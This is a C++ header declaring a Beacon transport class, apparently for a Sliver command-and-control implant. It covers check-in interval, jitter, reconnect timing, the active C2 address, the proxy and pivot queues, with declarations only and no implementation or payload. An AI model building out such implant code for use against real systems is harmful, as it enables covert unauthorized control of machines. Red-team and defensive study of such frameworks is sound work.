#pragma once
#include<iostream>
#include "Client.h"
#include <chrono>
#include "concurrent_queue.h"
using namespace std;

namespace transports {
	
	class Beacon {
	public:
		Beacon(const string&, unique_ptr<IClient>&,const string& = "", int interval = 5, int jitter = 1, int reconnectInterval = 30);
		bool BeaconInit();
		void BeaconStart();
		bool BeaconSend(sliverpb::Envelope&);
		unique_ptr<sliverpb::Envelope> BeaconRecv();
		bool BeaconRecv(const sliverpb::Envelope&, sliverpb::Envelope&);
		//void BeaconClose();
		//void BeaconCleanup();
		std::chrono::seconds Duration();
		std::chrono::seconds GetInterval();
		std::chrono::seconds GetJitter();
		std::chrono::seconds GetReconnectInterval();
		bool Reconfigure(int64_t interval, int64_t jitter, int64_t reconnectInterval);
		int GetConnectionErrors();
		void SetConnectionErrors(int);
		std::chrono::duration<int> reconnectInterval;
		std::chrono::duration<int> jitter;
		std::chrono::duration<int> interval;
		int connectionErrors = 0;
		string activeC2;
		string proxyURL;
		std::mutex m;
		std::unique_ptr<IClient> client;
		shared_ptr<concurrency::concurrent_queue<sliverpb::Envelope>> pivotEnvelope_queue;
	};
}